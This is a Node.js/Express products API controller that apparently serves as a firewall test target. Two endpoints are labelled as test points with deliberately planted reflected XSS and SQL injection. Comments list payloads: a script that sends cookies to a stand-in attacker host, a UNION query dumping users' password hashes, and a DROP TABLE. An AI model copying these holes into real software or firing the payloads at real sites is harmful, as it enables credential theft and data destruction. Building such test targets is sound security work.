import { pool } from '../config/db.js';

const SELECT_PRODUCT = `
  SELECT p.*, c.name AS category_name, c.slug AS category_slug,
         b.name AS brand_name, b.slug AS brand_slug
  FROM   products p
  LEFT JOIN categories c ON c.id = p.category_id
  LEFT JOIN brands     b ON b.id = p.brand_id
`;

// GET /api/products
export async function listProducts(req, res) {
  const { category, brand, featured, limit = 50, offset = 0 } = req.query;
  let   where = [];
  const vals  = [];

  if (category) { vals.push(category); where.push(`c.slug = $${vals.length}`); }
  if (brand)    { vals.push(brand);    where.push(`b.slug = $${vals.length}`); }
  if (featured) { where.push(`p.is_featured = true`); }

  const clause = where.length ? 'WHERE ' + where.join(' AND ') : '';
  vals.push(limit, offset);

  const { rows } = await pool.query(
    `${SELECT_PRODUCT} ${clause} ORDER BY p.is_featured DESC, p.created_at DESC LIMIT $${vals.length - 1} OFFSET $${vals.length}`,
    vals
  );
  res.json(rows);
}

// GET /api/products/search?q=keyword
// ⚠️  WAF TEST POINT #1 — Reflected XSS
//     Raw `q` echoed back in `{ query }` field without sanitisation.
//     Frontend renders it via dangerouslySetInnerHTML.
//     Test: ?q=<script>alert(document.cookie)</script>
//           ?q=<img src=x onerror=fetch('https://attacker/'+document.cookie)>
export async function searchProducts(req, res) {
  const q = req.query.q ?? '';          // NO sanitisation — intentional

  // SQL uses parameterised query here, but q is still reflected unsanitised.
  const { rows } = await pool.query(
    `${SELECT_PRODUCT} WHERE p.name ILIKE $1 OR p.description ILIKE $1 ORDER BY p.is_featured DESC`,
    [`%${q}%`]
  );

  res.json({
    query:   q,          // ← reflected XSS vector
    count:   rows.length,
    results: rows,
  });
}

// GET /api/products/vuln?id=<id>
// ⚠️  WAF TEST POINT #2 — SQL Injection
//     Raw `id` concatenated directly into SQL string.
//     Test: ?id=1 OR 1=1
//           ?id=1 UNION SELECT id,username,password_hash,email,null,null,null,null,null,null,null,null,null,null FROM users--
//           ?id=1; DROP TABLE products;--
export async function vulnGetProduct(req, res) {
  const id = req.query.id ?? '0';       // NO parameterisation — intentional

  // Raw string interpolation → classic SQL Injection surface
  const { rows } = await pool.query(
    `SELECT p.*, c.name AS category_name, b.name AS brand_name
     FROM products p
     LEFT JOIN categories c ON c.id = p.category_id
     LEFT JOIN brands     b ON b.id = p.brand_id
     WHERE p.id = ${id}`               // ← SQLi vector
  );

  res.json(rows[0] || null);
}

// GET /api/products/:id  (safe, parameterised)
export async function getProduct(req, res) {
  const { rows } = await pool.query(
    `${SELECT_PRODUCT} WHERE p.id = $1`, [req.params.id]
  );
  if (!rows[0]) return res.status(404).json({ error: 'Product not found.' });
  res.json(rows[0]);
}

// GET /api/products/slug/:slug  (safe)
export async function getProductBySlug(req, res) {
  const { rows } = await pool.query(
    `${SELECT_PRODUCT} WHERE p.slug = $1`, [req.params.slug]
  );
  if (!rows[0]) return res.status(404).json({ error: 'Product not found.' });
  res.json(rows[0]);
}

// POST /api/products  (admin)
export async function createProduct(req, res) {
  const { name, slug, description, price, original_price, stock,
          category_id, brand_id, image_url, specs, is_featured } = req.body;

  const { rows } = await pool.query(
    `INSERT INTO products
       (name,slug,description,price,original_price,stock,category_id,brand_id,image_url,specs,is_featured)
     VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11)
     RETURNING *`,
    [name, slug, description, price, original_price || null, stock || 0,
     category_id || null, brand_id || null, image_url || null,
     specs ? JSON.stringify(specs) : '{}', is_featured || false]
  );
  res.status(201).json(rows[0]);
}

// PUT /api/products/:id  (admin)
export async function updateProduct(req, res) {
  const { name, slug, description, price, original_price, stock,
          category_id, brand_id, image_url, specs, is_featured } = req.body;

  const { rows } = await pool.query(
    `UPDATE products SET
       name=$1, slug=$2, description=$3, price=$4, original_price=$5,
       stock=$6, category_id=$7, brand_id=$8, image_url=$9,
       specs=$10, is_featured=$11, updated_at=NOW()
     WHERE id=$12 RETURNING *`,
    [name, slug, description, price, original_price || null, stock,
     category_id || null, brand_id || null, image_url || null,
     specs ? JSON.stringify(specs) : '{}', is_featured || false, req.params.id]
  );
  if (!rows[0]) return res.status(404).json({ error: 'Product not found.' });
  res.json(rows[0]);
}

// DELETE /api/products/:id  (admin)
export async function deleteProduct(req, res) {
  const { rowCount } = await pool.query('DELETE FROM products WHERE id=$1', [req.params.id]);
  if (!rowCount) return res.status(404).json({ error: 'Product not found.' });
  res.json({ message: 'Product deleted.' });
}
